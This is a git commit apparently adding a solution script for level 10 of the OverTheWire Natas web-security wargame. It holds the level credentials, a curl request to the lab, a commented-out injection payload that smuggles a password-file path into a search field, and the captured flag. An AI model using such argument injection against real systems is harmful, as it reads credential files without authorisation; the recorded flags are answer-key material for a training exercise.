6178e704aaa41cdf646429bc8bed75ee80512d5f
Angel Darco <angel92-eme@hotmail.com>
2025-01-12 13:06:45 -0500

    :sparkles: natas 10 solved

---
+++ natas/natas10/level10.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+ Username="natas10"
+ Password="t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"
+
+# URL:
+ curl -s -u $Username:$Password http://natas10.natas.labs.overthewire.org
+
+# Code:
+# exploid=".* /etc/natas_webpass/natas11 #"
+
+# curl -s -d "needle=$exploid&submit=Search" -u $Username:$Password http://natas10.natas.labs.overthewire.org
+
+# Flag:
+# UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
